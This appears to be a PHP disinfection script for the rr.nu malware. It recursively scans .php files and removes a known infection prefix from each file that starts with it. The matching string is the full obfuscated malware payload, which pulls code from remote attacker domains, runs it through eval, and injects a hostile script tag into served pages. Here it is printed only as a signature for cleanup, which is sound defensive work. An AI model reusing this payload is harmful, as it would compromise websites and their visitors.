<?php
/**
 * Vaccine: Malware rr.nu
 * This simple script will read all file php recursivelly from directory and cleanup string defined by rr.nu
 * 
 * @author Walker de Alencar <walkeralencar@gmail.com>
 */
class rrnuVaccine {

    private $directory;
    private $counter;
    private $string;
    private $log = '';

    private function __construct() {
        
    }

    /**
     * @return rrnuVacine
     */
    public static function create() {
        return new self();
    }

    /**
     * Define root directory to start the recursive search to Vacine all php files.
     * @param type $dir
     * @return rrnuVacine 
     */
    public function setDirectory($dir) {
        $this->directory = $dir;
        return $this;
    }

    /**
     * Define all string of rr.nu
     * @param type $string
     * @return rrnuVacine 
     */
    public function setString($string) {
        $this->string = $string;
        return $this;
    }

    private function getDirectory() {
        return $this->directory;
    }

    private function getString() {
        return $this->string;
    }

    private function validate() {
        if (is_null($this->getString())) {
            throw new exception('Define the string from rr.nu!');
        }
        if (is_null($this->getDirectory())) {
            throw new exception('Define the root directory to Vacine!');
        }
    }

    private function startup() {
        $this->counter = array(
            'free' => 0,
            'infected' => 0,
            'disinfected' => 0,
            'total' => 0,
        );
    }

    private function vaccine($directory) {
        $strSize = strlen($this->getString());
        $currentDir = dir($directory);

        while (false !== ($entry = $currentDir->read())) {
            $file = $directory . DIRECTORY_SEPARATOR . $entry;

            if ($entry != "." && $entry != ".." && is_dir($file)) {
                $this->vaccine($file);
            } else {
                if (pathinfo($entry, PATHINFO_EXTENSION) == 'php') {
                    if (file_get_contents($file, null, null, 0, $strSize) == $this->getString()) {
                        if (false === file_put_contents($file, file_get_contents($file, null, null, $strSize, filesize($file) - $strSize))) {
                            $status = '<em style="color:darkred">infected!</em>';
                            $this->counter['infected']++;
                        } else {
                            $status = '<em style="color:darkgreen">disinfected!</em>';
                            $this->counter['disinfected']++;
                        }
                        
                    } else {
                        $status = '<em style="color:darkblue">free</em>';
                        $this->counter['free']++;
                    }
                    $this->counter['total']++;
                    $this->log .= $file . "[" . $status . "]<br>\n";
                }
            }
        }
        $currentDir->close();
        
    }

    public function execute() {
        $this->validate();
        $this->startup();
        $this->vaccine($this->getDirectory());
       
        $result = array();
        foreach($this->counter as $key => $value){
            $result[] = "<b>{$key}</b>({$value}) ";
        }

        return "<h4>".implode(' | ',$result)."</h4>\n". $this->log;
    }

}

echo '<div style="color:#333; font-family:Verdana; font-size:11px;">';
echo '<h2>nn.ru Vaccine - Beta</h2>';
echo '<h3>by Walker de Alencar (walkeralencar@gmail.com)</h3>';
echo rrnuVaccine::create()
        ->setDirectory(getcwd())
        ->setString('<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJF9TRVJWRVJbJ21yX25vJ10pKXsgICRfU0VSVkVSWydtcl9ubyddPTE7ICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICBmdW5jdGlvbiBnZXRfdGRzXzc3NygkdXJsKXskY29udGVudD0iIjskY29udGVudD1AdHJ5Y3VybF83NzcoJHVybCk7aWYoJGNvbnRlbnQhPT1mYWxzZSlyZXR1cm4gJGNvbnRlbnQ7JGNvbnRlbnQ9QHRyeWZpbGVfNzc3KCR1cmwpO2lmKCRjb250ZW50IT09ZmFsc2UpcmV0dXJuICRjb250ZW50OyRjb250ZW50PUB0cnlmb3Blbl83NzcoJHVybCk7aWYoJGNvbnRlbnQhPT1mYWxzZSlyZXR1cm4gJGNvbnRlbnQ7JGNvbnRlbnQ9QHRyeWZzb2Nrb3Blbl83NzcoJHVybCk7aWYoJGNvbnRlbnQhPT1mYWxzZSlyZXR1cm4gJGNvbnRlbnQ7JGNvbnRlbnQ9QHRyeXNvY2tldF83NzcoJHVybCk7aWYoJGNvbnRlbnQhPT1mYWxzZSlyZXR1cm4gJGNvbnRlbnQ7cmV0dXJuICcnO30gIGZ1bmN0aW9uIHRyeWN1cmxfNzc3KCR1cmwpe2lmKGZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0Jyk9PT1mYWxzZSlyZXR1cm4gZmFsc2U7JGNoID0gY3VybF9pbml0ICgpO2N1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfVVJMLCR1cmwpO2N1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpO2N1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfVElNRU9VVCwgNSk7Y3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOyRyZXN1bHQgPSBjdXJsX2V4ZWMgKCRjaCk7Y3VybF9jbG9zZSgkY2gpO2lmICgkcmVzdWx0PT0iIilyZXR1cm4gZmFsc2U7cmV0dXJuICRyZXN1bHQ7fSAgZnVuY3Rpb24gdHJ5ZmlsZV83NzcoJHVybCl7aWYoZnVuY3Rpb25fZXhpc3RzKCdmaWxlJyk9PT1mYWxzZSlyZXR1cm4gZmFsc2U7JGluYz1AZmlsZSgkdXJsKTskYnVmPUBpbXBsb2RlKCcnLCRpbmMpO2lmICgkYnVmPT0iIilyZXR1cm4gZmFsc2U7cmV0dXJuICRidWY7fSAgZnVuY3Rpb24gdHJ5Zm9wZW5fNzc3KCR1cmwpe2lmKGZ1bmN0aW9uX2V4aXN0cygnZm9wZW4nKT09PWZhbHNlKXJldHVybiBmYWxzZTskYnVmPScnOyRmPUBmb3BlbigkdXJsLCdyJyk7aWYgKCRmKXt3aGlsZSghZmVvZigkZikpeyRidWYuPWZyZWFkKCRmLDEwMDAwKTt9ZmNsb3NlKCRmKTt9ZWxzZSByZXR1cm4gZmFsc2U7aWYgKCRidWY9PSIiKXJldHVybiBmYWxzZTtyZXR1cm4gJGJ1Zjt9ICBmdW5jdGlvbiB0cnlmc29ja29wZW5fNzc3KCR1cmwpe2lmKGZ1bmN0aW9uX2V4aXN0cygnZnNvY2tvcGVuJyk9PT1mYWxzZSlyZXR1cm4gZmFsc2U7JHA9QHBhcnNlX3VybCgkdXJsKTskaG9zdD0kcFsnaG9zdCddOyR1cmk9JHBbJ3BhdGgnXS4nPycuJHBbJ3F1ZXJ5J107JGY9QGZzb2Nrb3BlbigkaG9zdCw4MCwkZXJybm8sICRlcnJzdHIsMzApO2lmKCEkZilyZXR1cm4gZmFsc2U7JHJlcXVlc3QgPSJHRVQgJHVyaSBIVFRQLzEuMFxuIjskcmVxdWVzdC49Ikhvc3Q6ICRob3N0XG5cbiI7ZndyaXRlKCRmLCRyZXF1ZXN0KTskYnVmPScnO3doaWxlKCFmZW9mKCRmKSl7JGJ1Zi49ZnJlYWQoJGYsMTAwMDApO31mY2xvc2UoJGYpO2lmICgkYnVmPT0iIilyZXR1cm4gZmFsc2U7bGlzdCgkbSwkYnVmKT1leHBsb2RlKGNocigxMykuY2hyKDEwKS5jaHIoMTMpLmNocigxMCksJGJ1Zik7cmV0dXJuICRidWY7fSAgZnVuY3Rpb24gdHJ5c29ja2V0Xzc3NygkdXJsKXtpZihmdW5jdGlvbl9leGlzdHMoJ3NvY2tldF9jcmVhdGUnKT09PWZhbHNlKXJldHVybiBmYWxzZTskcD1AcGFyc2VfdXJsKCR1cmwpOyRob3N0PSRwWydob3N0J107JHVyaT0kcFsncGF0aCddLic/Jy4kcFsncXVlcnknXTskaXAxPUBnZXRob3N0YnluYW1lKCRob3N0KTskaXAyPUBsb25nMmlwKEBpcDJsb25nKCRpcDEpKTsgaWYgKCRpcDEhPSRpcDIpcmV0dXJuIGZhbHNlOyRzb2NrPUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7aWYgKCFAc29ja2V0X2Nvbm5lY3QoJHNvY2ssJGlwMSw4MCkpe0Bzb2NrZXRfY2xvc2UoJHNvY2spO3JldHVybiBmYWxzZTt9JHJlcXVlc3QgPSJHRVQgJHVyaSBIVFRQLzEuMFxuIjskcmVxdWVzdC49Ikhvc3Q6ICRob3N0XG5cbiI7c29ja2V0X3dyaXRlKCRzb2NrLCRyZXF1ZXN0KTskYnVmPScnO3doaWxlKCR0PXNvY2tldF9yZWFkKCRzb2NrLDEwMDAwKSl7JGJ1Zi49JHQ7fUBzb2NrZXRfY2xvc2UoJHNvY2spO2lmICgkYnVmPT0iIilyZXR1cm4gZmFsc2U7bGlzdCgkbSwkYnVmKT1leHBsb2RlKGNocigxMykuY2hyKDEwKS5jaHIoMTMpLmNocigxMCksJGJ1Zik7cmV0dXJuICRidWY7fSAgZnVuY3Rpb24gdXBkYXRlX3Rkc19maWxlXzc3NygkdGRzZmlsZSl7JGFjdHVhbDE9JF9TRVJWRVJbJ3NfYTEnXTskYWN0dWFsMj0kX1NFUlZFUlsnc19hMiddOyR2YWw9Z2V0X3Rkc183NzcoJGFjdHVhbDEpO2lmICgkdmFsPT0iIikkdmFsPWdldF90ZHNfNzc3KCRhY3R1YWwyKTskZj1AZm9wZW4oJHRkc2ZpbGUsInciKTtpZiAoJGYpe0Bmd3JpdGUoJGYsJHZhbCk7QGZjbG9zZSgkZik7fWlmIChzdHJzdHIoJHZhbCwifHx8Q09ERXx8fCIpKXtsaXN0KCR2YWwsJGNvZGUpPWV4cGxvZGUoInx8fENPREV8fHwiLCR2YWwpO2V2YWwoYmFzZTY0X2RlY29kZSgkY29kZSkpO31yZXR1cm4gJHZhbDt9ICBmdW5jdGlvbiBnZXRfYWN0dWFsX3Rkc183NzcoKXskZGVmYXVsdGRvbWFpbj0kX1NFUlZFUlsnc19kMSddOyRkaXI9JF9TRVJWRVJbJ3NfcDEnXTskdGRzZmlsZT0kZGlyLiJsb2cxLnR4dCI7aWYgKEBmaWxlX2V4aXN0cygkdGRzZmlsZSkpeyRtdGltZT1AZmlsZW10aW1lKCR0ZHNmaWxlKTskY3RpbWU9dGltZSgpLSRtdGltZTtpZiAoJGN0aW1lPiRfU0VSVkVSWydzX3QxJ10peyRjb250ZW50PXVwZGF0ZV90ZHNfZmlsZV83NzcoJHRkc2ZpbGUpO31lbHNleyRjb250ZW50PUBmaWxlX2dldF9jb250ZW50cygkdGRzZmlsZSk7fX1lbHNleyRjb250ZW50PXVwZGF0ZV90ZHNfZmlsZV83NzcoJHRkc2ZpbGUpO30kdGRzPUBleHBsb2RlKCJcbiIsJGNvbnRlbnQpOyRjPUBjb3VudCgkdGRzKSswOyR1cmw9JGRlZmF1bHRkb21haW47aWYgKCRjPjEpeyR1cmw9dHJpbSgkdGRzW210X3JhbmQoMCwkYy0yKV0pO31yZXR1cm4gJHVybDt9ICBmdW5jdGlvbiBpc19tYWNfNzc3KCR1YSl7JG1hYz0wO2lmIChzdHJpc3RyKCR1YSwibWFjIil8fHN0cmlzdHIoJHVhLCJzYWZhcmkiKSlpZiAoKCFzdHJpc3RyKCR1YSwid2luZG93cyIpKSYmKCFzdHJpc3RyKCR1YSwiaXBob25lIikpKSRtYWM9MTtyZXR1cm4gJG1hYzt9ICBmdW5jdGlvbiBpc19tc2llXzc3NygkdWEpeyRtc2llPTA7aWYgKHN0cmlzdHIoJHVhLCJNU0lFIDYiKXx8c3RyaXN0cigkdWEsIk1TSUUgNyIpfHxzdHJpc3RyKCR1YSwiTVNJRSA4Iil8fHN0cmlzdHIoJHVhLCJNU0lFIDkiKSkkbXNpZT0xO3JldHVybiAkbXNpZTt9ICAgIGZ1bmN0aW9uIHNldHVwX2dsb2JhbHNfNzc3KCl7JHJ6PSRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uIi8ubG9ncy8iOyRtej0iL3RtcC8iO2lmICghaXNfZGlyKCRyeikpe0Bta2RpcigkcnopO2lmIChpc19kaXIoJHJ6KSl7JG16PSRyejt9ZWxzZXskcno9JF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdLiIvLmxvZ3MvIjtpZiAoIWlzX2RpcigkcnopKXtAbWtkaXIoJHJ6KTtpZiAoaXNfZGlyKCRyeikpeyRtej0kcno7fX1lbHNleyRtej0kcno7fX19ZWxzZXskbXo9JHJ6O30kYm90PTA7JHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTtpZiAoc3RyaXN0cigkdWEsIm1zbmJvdCIpfHxzdHJpc3RyKCR1YSwiWWFob28iKSkkYm90PTE7aWYgKHN0cmlzdHIoJHVhLCJiaW5nYm90Iil8fHN0cmlzdHIoJHVhLCJnb29nbGUiKSkkYm90PTE7JG1zaWU9MDtpZiAoaXNfbXNpZV83NzcoJHVhKSkkbXNpZT0xOyRtYWM9MDtpZiAoaXNfbWFjXzc3NygkdWEpKSRtYWM9MTtpZiAoKCRtc2llPT0wKSYmKCRtYWM9PTApKSRib3Q9MTsgIGdsb2JhbCAkX1NFUlZFUjsgICAgJF9TRVJWRVJbJ3NfcDEnXT0kbXo7ICAkX1NFUlZFUlsnc19iMSddPSRib3Q7ICAkX1NFUlZFUlsnc190MSddPTEyMDA7ICAkX1NFUlZFUlsnc19kMSddPSJodHRwOi8vc3dlZXBzdGFrZXNhbmRjb250ZXN0c2RvLmNvbS8iOyAgJGQ9Jz9kPScudXJsZW5jb2RlKCRfU0VSVkVSWyJIVFRQX0hPU1QiXSkuIiZwPSIudXJsZW5jb2RlKCRfU0VSVkVSWyJQSFBfU0VMRiJdKS4iJmE9Ii51cmxlbmNvZGUoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdKTsgICRfU0VSVkVSWydzX2ExJ109J2h0dHA6Ly93d3cubGlseXBvcGhpbHlwb3AuY29tL2dfbG9hZC5waHAnLiRkOyAgJF9TRVJWRVJbJ3NfYTInXT0naHR0cDovL3d3dy5sb2x5cG9waG9seXBvcC5jb20vZ19sb2FkLnBocCcuJGQ7ICAkX1NFUlZFUlsnc19zY3JpcHQnXT0icG1nLnBocD9kcj0xIjsgIH0gICAgICBzZXR1cF9nbG9iYWxzXzc3NygpOyAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnbWxfNzc3JykpeyAgZnVuY3Rpb24gZ21sXzc3NygpeyAgICAkcl9zdHJpbmdfNzc3PScnOyAgaWYgKCRfU0VSVkVSWydzX2IxJ109PTApJHJfc3RyaW5nXzc3Nz0nPHNjcmlwdCBzcmM9IicuZ2V0X2FjdHVhbF90ZHNfNzc3KCkuJF9TRVJWRVJbJ3Nfc2NyaXB0J10uJyI+PC9zY3JpcHQ+JzsgIHJldHVybiAkcl9zdHJpbmdfNzc3OyAgfSAgfSAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2d6ZGVjb2RlaXQnKSl7ICBmdW5jdGlvbiBnemRlY29kZWl0KCRkZWNvZGUpeyAgJHQ9QG9yZChAc3Vic3RyKCRkZWNvZGUsMywxKSk7ICAkc3RhcnQ9MTA7ICAkdj0wOyAgaWYoJHQmNCl7ICAkc3RyPUB1bnBhY2soJ3YnLHN1YnN0cigkZGVjb2RlLDEwLDIpKTsgICRzdHI9JHN0clsxXTsgICRzdGFydCs9Miskc3RyOyAgfSAgaWYoJHQmOCl7ICAkc3RhcnQ9QHN0cnBvcygkZGVjb2RlLGNocigwKSwkc3RhcnQpKzE7ICB9ICBpZigkdCYxNil7ICAkc3RhcnQ9QHN0cnBvcygkZGVjb2RlLGNocigwKSwkc3RhcnQpKzE7ICB9ICBpZigkdCYyKXsgICRzdGFydCs9MjsgIH0gICRyZXQ9QGd6aW5mbGF0ZShAc3Vic3RyKCRkZWNvZGUsJHN0YXJ0KSk7ICBpZigkcmV0PT09RkFMU0UpeyAgJHJldD0kZGVjb2RlOyAgfSAgcmV0dXJuICRyZXQ7ICB9ICB9ICBmdW5jdGlvbiBtcm9iaCgkY29udGVudCl7ICBASGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAkZGVjb2RlZF9jb250ZW50PWd6ZGVjb2RlaXQoJGNvbnRlbnQpOyAgaWYocHJlZ19tYXRjaCgnL1w8XC9ib2R5L3NpJywkZGVjb2RlZF9jb250ZW50KSl7ICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWxfNzc3KCkuIlxuIi4nJDEnLCRkZWNvZGVkX2NvbnRlbnQpOyAgfWVsc2V7ICByZXR1cm4gJGRlY29kZWRfY29udGVudC5nbWxfNzc3KCk7ICB9ICB9ICBvYl9zdGFydCgnbXJvYmgnKTsgIH0gIH0="));?>')
        ->execute();
echo '</div>';